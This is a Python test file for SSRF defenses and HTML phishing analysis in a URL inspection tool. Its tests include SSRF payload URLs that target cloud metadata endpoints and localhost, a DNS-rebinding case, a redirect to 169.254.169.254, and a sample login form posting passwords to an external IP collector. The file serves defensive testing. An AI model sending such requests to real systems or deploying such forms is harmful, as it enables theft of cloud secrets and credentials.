"""
Security tests for SSRF protections, private network blocking, and content analysis (Tests 9, 19, 20).
"""

import socket
from unittest.mock import patch, MagicMock
import pytest
from src.inspection.safe_fetcher import (
    validate_ssrf_safety,
    is_ip_blocked,
    safe_fetch_url
)
from src.inspection.content_analyzer import analyze_html_content

def test_blocked_ip_ranges():
    """Test 19: Comprehensive SSRF IP network blocking."""
    # Loopback
    assert is_ip_blocked("127.0.0.1") is True
    assert is_ip_blocked("127.10.20.30") is True
    assert is_ip_blocked("::1") is True
    
    # Private RFC 1918
    assert is_ip_blocked("10.0.0.1") is True
    assert is_ip_blocked("172.16.5.20") is True
    assert is_ip_blocked("192.168.1.100") is True
    
    # Cloud Metadata Endpoint (AWS, GCP, Azure)
    assert is_ip_blocked("169.254.169.254") is True
    
    # Multicast & Broadcast
    assert is_ip_blocked("224.0.0.1") is True
    assert is_ip_blocked("255.255.255.255") is True
    
    # Public Internet IPs should NOT be blocked
    assert is_ip_blocked("8.8.8.8") is False
    assert is_ip_blocked("1.1.1.1") is False
    assert is_ip_blocked("142.250.190.46") is False

def test_ssrf_hostname_blocks():
    """Test 19: Block explicit cloud metadata and localhost hostnames."""
    is_safe_1, reason_1, _ = validate_ssrf_safety("http://localhost:8080/admin")
    assert is_safe_1 is False
    assert "SSRF Block" in reason_1

    is_safe_2, reason_2, _ = validate_ssrf_safety("http://metadata.google.internal/computeMetadata/v1/")
    assert is_safe_2 is False
    assert "SSRF Block" in reason_2

def test_dns_resolution_to_private_ip():
    """Test 19: Block public domain names that resolve to private IP addresses."""
    with patch("socket.getaddrinfo") as mock_getaddr:
        # Mock resolving attacker-domain.com to 127.0.0.1
        mock_getaddr.return_value = [
            (socket.AF_INET, socket.SOCK_STREAM, 6, "", ("127.0.0.1", 80))
        ]
        is_safe, reason, ips = validate_ssrf_safety("http://attacker-rebinding.com")
        assert is_safe is False
        assert "forbidden/private IP" in reason

def test_redirect_based_ssrf_attempt():
    """Test 20: Detect and block SSRF via HTTP 302 redirect hopping to internal IP."""
    import socket
    with patch("src.inspection.safe_fetcher.validate_ssrf_safety") as mock_val:
        # First hop is safe, second hop (redirect) is SSRF
        mock_val.side_effect = [
            (True, "Safe", ["93.184.216.34"]),
            (False, "SSRF Block: Host resolves to forbidden/private IP (169.254.169.254)", ["169.254.169.254"])
        ]
        
        with patch("requests.Session.get") as mock_get:
            mock_resp = MagicMock()
            mock_resp.status_code = 302
            mock_resp.headers = {"Location": "http://169.254.169.254/latest/meta-data/"}
            mock_get.return_value = mock_resp
            
            res = safe_fetch_url("http://innocent-looking-redirector.com")
            assert res["success"] is False
            assert res["ssrf_blocked"] is True
            assert "169.254.169.254" in res["error"]

def test_content_analyzer_password_form_external_target():
    """Test HTML analysis: Credential input posting to external host."""
    html = """
    <html>
      <head><title>Account Login</title></head>
      <body>
        <form action="http://198.51.100.22/collect.php" method="POST">
          <input type="text" name="username">
          <input type="password" name="password">
          <button type="submit">Log In</button>
        </form>
      </body>
    </html>
    """
    res = analyze_html_content(html, "https://mybank.com/signin")
    assert res["has_password_field"] is True
    assert res["external_action_count"] > 0
    assert any("Posts to External Domain" in f["name"] or "Directly to IP" in f["name"] for f in res["findings"])
